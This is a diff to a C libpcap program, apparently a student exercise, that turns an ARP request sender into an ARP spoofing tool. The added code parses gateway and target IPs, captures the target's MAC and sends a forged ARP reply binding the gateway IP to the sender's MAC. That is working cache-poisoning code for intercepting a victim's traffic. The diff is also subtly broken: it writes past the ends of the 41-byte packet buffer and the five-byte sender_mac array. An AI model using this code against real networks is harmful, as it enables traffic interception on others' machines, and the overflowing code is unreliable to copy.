@@ -13,8 +13,8 @@
 #include <stdlib.h>
 #define MAC_STRING_LENGTH 13
 
-u_char packet[61];
-
+u_char packet[41];
+u_char sender_mac[5];
 char *getmac(char *iface)
 {
     char *ret = malloc(MAC_STRING_LENGTH);
@@ -25,6 +25,7 @@ char *getmac(char *iface)
     {
         int i;
         for (i=0;i<6;++i){
+            sender_mac[i]=s.ifr_addr.sa_data[i];
             packet[i+6]=s.ifr_addr.sa_data[i]; // Source MAC
             packet[i+22]=s.ifr_addr.sa_data[i]; // Sender MAC Address
             printf(" %02x",(unsigned char) s.ifr_addr.sa_data[i]);
@@ -64,7 +65,7 @@ struct sniff_ip {
 #define SIZE_ETHERNET 14
 int main(int argc, char *argv[])
 {
-    int i;
+    int i=0;
     pcap_t *handle;
     char errbuf[PCAP_ERRBUF_SIZE];
     struct pcap_pkthdr *header;
@@ -74,7 +75,7 @@ int main(int argc, char *argv[])
     SSS *ethernet;
     if(argc < 4)
     {
-        printf("usage ./filename [network device][sender ip][target ip]\n");
+        printf("usage ./filename [network device][gateway ip][target ip]\n");
         return EXIT_SUCCESS;
     }
     char *mac = getmac(argv[1]);
@@ -104,13 +105,35 @@ int main(int argc, char *argv[])
     packet[35]=0x00;
     packet[36]=0x00;
     packet[37]=0x00;
-    // target IP
-    packet[38]=0xc0;
-    packet[39]=0xa8;
-    packet[40]=0xff;
-    packet[41]=0x88;
-    printf("sender ip : %s\n",argv[2]); // sender ip
-    printf("target ip : %s\n",argv[3]); // target ip
+    char *gateway_ip[5]={NULL,};
+    char *ptr = strtok(argv[2],".");
+    i=0;
+    while(ptr != NULL)
+    {
+        gateway_ip[i] = ptr;
+        i++;
+        ptr = strtok(NULL,".");
+    }
+    printf("[-]gateway ip : %s.%s.%s.%s\n",gateway_ip[0],gateway_ip[1],gateway_ip[2],gateway_ip[3]);
+
+    char *target_ip[5]={NULL,};
+    char *ptr2 = strtok(argv[3],".");
+    i=0;
+    while(ptr2 != NULL)
+    {
+        target_ip[i] = ptr2;
+        i++;
+        ptr2 = strtok(NULL,".");
+    }
+    printf("[-]target ip : %s.%s.%s.%s\n",target_ip[0],target_ip[1],target_ip[2],target_ip[3]);
+    
+    //target ip
+    packet[38] = atoi(target_ip[0]);
+    packet[39] = atoi(target_ip[1]);
+    packet[40] = atoi(target_ip[2]);
+    packet[41] = atoi(target_ip[3]);
+    
+
     handle = pcap_open_live(argv[1], BUFSIZ, 1, 100,errbuf);
     if(handle == NULL) {
         fprintf(stderr, "Couldn't open device %s : %s", argv[1],errbuf);
@@ -127,6 +150,7 @@ int main(int argc, char *argv[])
     ip = (struct sniff_ip*)(pkt_data+SIZE_ETHERNET);
     //if(pkt_data[20]==0x20){
         if(ntohs(ethernet -> ether_type)==ETHERTYPE_ARP){
+            printf("[-]Data :");
             for(i=0;i<42;i++){
                 printf(" %02x",pkt_data[i]);
                 if(i>22 && i<=27){
@@ -134,10 +158,53 @@ int main(int argc, char *argv[])
                 }
             }
             printf("\n");
-            printf("target_mac : ");
+            printf("[-]target_mac : ");
             for(i=0;i<6;i++)
                 printf(" %02x",target_mac[i]);
             printf("\n");
+            packet[0]=target_mac[0];
+            packet[1]=target_mac[1];
+            packet[2]=target_mac[2];
+            packet[3]=target_mac[3];
+            packet[4]=target_mac[4];
+            packet[5]=target_mac[5];
+            packet[6]=sender_mac[0];
+            packet[7]=sender_mac[1];
+            packet[8]=sender_mac[2];
+            packet[9]=sender_mac[3];
+            packet[10]=sender_mac[4];
+            packet[11]=sender_mac[5];
+            // arp reply 
+            packet[21]=0x02;
+            // my mac address
+            packet[22]=sender_mac[0];
+            packet[23]=sender_mac[1];
+            packet[24]=sender_mac[2];
+            packet[25]=sender_mac[3];
+            packet[26]=sender_mac[4];
+            packet[27]=sender_mac[5];
+            // gateway ip
+            packet[28]=atoi(gateway_ip[0]);
+            packet[29]=atoi(gateway_ip[1]);
+            packet[30]=atoi(gateway_ip[2]);
+            packet[31]=atoi(gateway_ip[3]);
+            // target mac address
+            packet[32]=target_mac[0];
+            packet[33]=target_mac[1];
+            packet[34]=target_mac[2];
+            packet[35]=target_mac[3];
+            packet[36]=target_mac[4];
+            packet[37]=target_mac[5];
+            // target ip
+            packet[38]=atoi(target_ip[0]);
+            packet[39]=atoi(target_ip[1]);
+            packet[40]=atoi(target_ip[2]);
+            packet[41]=atoi(target_ip[3]);
+            if(pcap_sendpacket(handle,packet,42)!=0)
+            {
+                fprintf(stderr,"\nError sending the packet : %s",pcap_geterr(handle));
+                return 0;
+            }
             break;
         }
 
